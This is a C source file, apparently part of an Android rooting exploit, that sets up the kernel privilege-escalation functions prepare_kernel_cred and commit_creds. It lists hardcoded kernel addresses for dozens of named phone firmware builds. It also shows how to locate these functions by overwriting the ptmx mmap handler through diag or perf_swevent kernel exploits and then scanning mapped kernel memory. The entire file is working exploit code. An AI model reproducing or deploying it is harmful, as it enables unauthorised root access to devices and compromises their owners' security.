#include <errno.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "kallsyms.h"
#include "libperf_event_exploit/perf_event.h"
#include "device_database/device_database.h"

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int prepare_kernel_cred_address;
  unsigned long int commit_creds_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_IS17SH_01_00_04,                 0xc01c66a8, 0xc01c5fd8 },
  { DEVICE_SC01E_LJ3,                       0xc01244b8, 0xc0123d6c },
  { DEVICE_SC04E_MDI,                       0xc0096068, 0xc0095b54 },
  { DEVICE_SC04E_MF1,                       0xc00960d0, 0xc0095bbc },
  { DEVICE_SGP321_10_1_1_A_1_307, 			0xc0094124, 0xc0093c48 },
  { DEVICE_SGP312_10_1_C_0_370,             0xc009363c, 0xc0093160 },
  { DEVICE_SGP311_10_1_C_0_370,             0xc009363c, 0xc0093160 },
  { DEVICE_SH04E_01_00_02,                  0xc008d86c, 0xc008d398 },
  { DEVICE_SH04E_01_00_03,                  0xc008d99c, 0xc008d4c8 },
  { DEVICE_SO01E_9_1_C_0_473,               0xc009843c, 0xc0097f60 },
  { DEVICE_SO02E_10_1_D_0_343,              0xc009ca34, 0xc009c558 },
  { DEVICE_SO03E_10_1_E_0_265,              0xc00938a0, 0xc00933c4 },
  { DEVICE_SO03E_10_1_E_0_269,              0xc00938b0, 0xc00933d4 },
  { DEVICE_SO04E_10_1_1_D_0_179,            0xc009d500, 0xc009d024 },
  { DEVICE_SOL21_9_1_D_0_395,               0xc0098584, 0xc00980a8 },
  { DEVICE_SOL22_10_2_F_3_43,               0xc009d3f8, 0xc009cf1c },
  { DEVICE_HTL21_1_29_970_1,                0xc00ab9d8, 0xc00ab4c4 },
  { DEVICE_HTL22_1_05_970_1,                0xc00b2688, 0xc00b2174 },
  { DEVICE_HTL22_1_07_970_4,                0xc00b26a0, 0xc00b218c },
  { DEVICE_HTX21_1_20_971_1,                0xc00a6e54, 0xc00a6940 },
  { DEVICE_LG_E975_V10e,                    0xc00a0f90, 0xc00a0b6c },
  { DEVICE_LT26W_6_2_B_0_200,     0xc00b261c, 0xc00b2140 },
  { DEVICE_LT26W_6_2_B_0_211, 0xc00b262c, 0xc00b2150 },
  { DEVICE_LT26I_6_2_B_0_211,     0xc00b19d8, 0xc00b14fc },
  { DEVICE_LT26II_6_2_B_0_211, 0xc00b19d8, 0xc00b14fc },
  { DEVICE_LT22I_6_2_A_1_100 , 0xc00c37c8 ,0xc00c33f8},
  { DEVICE_ST27I_6_2_A_1_100, 0xc00c314c, 0xc00c2d7c},
  { DEVICE_ST27A_6_2_A_1_100, 0xc00c314c, 0xc00c2d7c},
  { DEVICE_C6603_10_1_1_A_1_307,  0xc0093dd4, 0xc00938f8 },
  { DEVICE_C6602_10_1_1_A_1_307, 0xc0093dd4, 0xc00938f8 },
  { DEVICE_C6603_10_1_1_A_1_253,  0xc0093dd4, 0xc00938f8 },
  { DEVICE_C6602_10_1_1_A_1_253, 0xc0093dd4, 0xc00938f8 },
  { DEVICE_C5302_12_0_A_1_284,    0xc009ec08, 0xc009e72c },
  { DEVICE_C5303_12_0_A_1_284, 0xc009ec08, 0xc009e72c },
  { DEVICE_C5306_12_0_A_1_284, 0xc009ec08, 0xc009e72c },
  { DEVICE_C6503_10_3_A_0_423,	0xc009ae60, 0xc009a984 },
  { DEVICE_C6502_10_3_A_0_423, 0xc009ae60, 0xc009a984 },
  { DEVICE_C6506_10_3_A_0_423, 0xc009ae60, 0xc009a984 },
  { DEVICE_LT30P_9_1_A_1_141, 0xc0094878, 0xc009439c },
  { DEVICE_LT30P_9_1_A_1_142, 0xc0094878, 0xc009439c},
  { DEVICE_LT29I_9_1_B_0_411, 0xc0095dec, 0xc0095910 },
  { DEVICE_LT29I_9_1_B_1_67, 0xc0095ca4, 0xc00957c8 },
  { DEVICE_LT25I_9_1_A_1_140, 0xc0097f20, 0xc0097a44},
  { DEVICE_LT25I_9_1_A_1_142, 0xc0097dd8, 0xc00978fc},
  { DEVICE_N05E_A1000311,                   0xc0094430, 0xc0093ebc },
  { DEVICE_NEXUS4_JDQ39, 0xc0089990, 0xc0089678 },
  { DEVICE_NEXUS_JOP40C,                 0xc00cdef0, 0xc00cdbb8 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
{
  int i;
  device_id_t device_id;

  device_id = detect_device();

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id){
      if (prepare_kernel_cred_address) {
        *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
      }
      if (commit_creds_address) {
        *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
      }
      return true;
    }
  }

  print_reason_device_not_supported();

  return false;
}

static uint32_t PAGE_OFFSET = 0xC0000000;

static void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_prepare_kernel_cred(void *mem, size_t length)
{
  void *prepare_kernel_cred;

  prepare_kernel_cred = memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!prepare_kernel_cred) {
    printf("Couldn't find prepare_kernel_cred address\n");
    return NULL;
  }

  return prepare_kernel_cred;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_commit_creds(void *mem, size_t length)
{
  void *commit_creds;

  commit_creds = memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!commit_creds) {
    printf("Couldn't find commit_creds address\n");
    return NULL;
  }

  return commit_creds;
}

#define KERNEL_SIZE 0x10000000

static bool
find_creds_functions_with_mmap(void *user_data)
{
  int fd;
  void *address;
  void *start_address = (void*) 0x10000000;

  fd = open(PTMX_DEVICE, O_RDWR);
  address = mmap(start_address, KERNEL_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                 fd, 0);
  if (address == MAP_FAILED) {
    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
    close(fd);
    return false;
  }

  prepare_kernel_cred = find_prepare_kernel_cred(address, KERNEL_SIZE);
  if (prepare_kernel_cred) {
    commit_creds = find_commit_creds(prepare_kernel_cred + 4, KERNEL_SIZE);

    prepare_kernel_cred = convert_to_kernel_address(prepare_kernel_cred, address);
    commit_creds = convert_to_kernel_address(commit_creds, address);
  }

  munmap(address, KERNEL_SIZE);

  close(fd);

  return prepare_kernel_cred && commit_creds;
}

static bool
find_with_diag_exploit(unsigned int ptmx_mmap_address)
{
  struct diag_values injection_data;

  injection_data.address = ptmx_mmap_address;
  injection_data.value = (uint16_t)&ptmx_mmap;

  return diag_run_exploit(&injection_data, 1,
                          find_creds_functions_with_mmap, NULL);
}

static bool
find_with_perf_swevent_exploit(unsigned int ptmx_mmap_address)
{
  return perf_swevent_run_exploit(ptmx_mmap_address, (int)&ptmx_mmap,
                                  find_creds_functions_with_mmap, NULL);
}

static bool
find_creds_functions_in_memory(void)
{
  unsigned long int ptmx_mmap_address;

  ptmx_mmap_address = get_ptmx_fops_address() + 0x28;

  if (diag_is_supported()) {
    return find_with_diag_exploit(ptmx_mmap_address);
  }
  return find_with_perf_swevent_exploit(ptmx_mmap_address);
}

bool
setup_creds_functions(void)
{
  if (kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
    commit_creds = kallsyms_get_symbol_address("commit_creds");
    return true;
  }

  if (get_creds_functions_addresses((void**)&prepare_kernel_cred, (void**)&commit_creds)) {
    return true;
  }

  return find_creds_functions_in_memory();
}

